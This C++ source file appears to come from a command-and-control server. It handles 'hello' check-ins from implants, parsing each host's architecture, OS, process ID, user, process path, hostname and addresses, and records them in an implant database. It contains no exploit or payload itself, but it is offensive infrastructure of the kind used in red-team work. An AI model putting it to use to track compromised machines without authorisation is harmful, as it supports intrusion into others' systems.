#include "hello.h"

#include <thread>

#include <spdlog/spdlog.h>
#include <oatpp/core/Types.hpp>
#include <util/string.hpp>

namespace handlers {

hello::hello() : results_thread{std::async(std::launch::async, [this] { service_results(); })} {}

hello::~hello() {
  results_queue.stop();
}

void hello::service_results() {

  while (true) {
    try {
      auto item = results_queue.wait_and_pop();
      auto implant_id = oatpp::String(item->first);
      try {
        if (_implant_service.exists(implant_id)) {
          spdlog::debug("Received hello from '{}'", item->first);
          std::vector<std::string> info = util::string::split(item->second->data, "|");
          if (info.size() == 8) {
            try {
              int architecture = std::stoi(info[1]);
              int operating_system = std::stoi(info[2]);
              int process_id = std::stoi(info[3]);
              auto process_user = oatpp::String(info[4]);
              auto process_path = oatpp::String(info[5]);
              auto system_name = oatpp::String(info[6]);
              auto system_addrs = oatpp::String(info[7]);
              _implant_service.updateById(implant_id, architecture, operating_system, process_id, process_user, process_path, system_name, system_addrs);
            }
            catch(const std::exception &e) {
              spdlog::error("Received hello from implant '{}' with invalid data, {}", item->first, e.what());
            }
          }
          else {
            spdlog::error("Received hello from implant '{}' with invalid data", item->first);
          }
        }
        else {
          spdlog::error("Received hello from unknown implant '{}'", item->first);
        }
      }
      catch (const std::exception& e) {
        spdlog::error("Error retrieving details for implant '{}' from database, {}", item->first, e.what());
      }
    }
    catch (const queue_stopped& e) {
      break;
    }
  }
}

void hello::on_result(const std::string& implant, std::shared_ptr<shared::message> message)
{
  if (util::string::compare_insensitive(message->type, "hello")) {
    results_queue.push(std::make_shared<queue_item>(implant, message));
  }
}

}
